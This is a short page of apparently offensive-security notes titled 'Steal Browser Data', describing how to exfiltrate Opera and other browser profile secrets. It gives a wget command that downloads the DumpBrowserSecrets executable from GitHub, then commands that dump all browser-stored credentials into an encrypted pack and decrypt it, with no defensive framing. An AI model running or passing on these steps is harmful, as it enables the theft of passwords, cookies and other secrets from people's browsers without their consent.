---
description: Exfiltrate Opera profile data 🌐🔑
---

# Steal Browser Data

{% embed url="https://github.com/Maldev-Academy/DumpBrowserSecrets" %}

To download above exe

{% code overflow="wrap" %}
```bash
wget https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe
```
{% endcode %}

We extract browser-stored credentials

{% code overflow="wrap" %}
```bash
DumpBrowserSecrets.exe /b:all /e:all /enc:0xCAFEBABE
```
{% endcode %}

We decrypt the extracted browser credentials

{% code overflow="wrap" %}
```bash
DumpBrowserSecrets.exe /dec:0xCAFEBABE /i EncPack-26-04-06-105119.bin
```
{% endcode %}
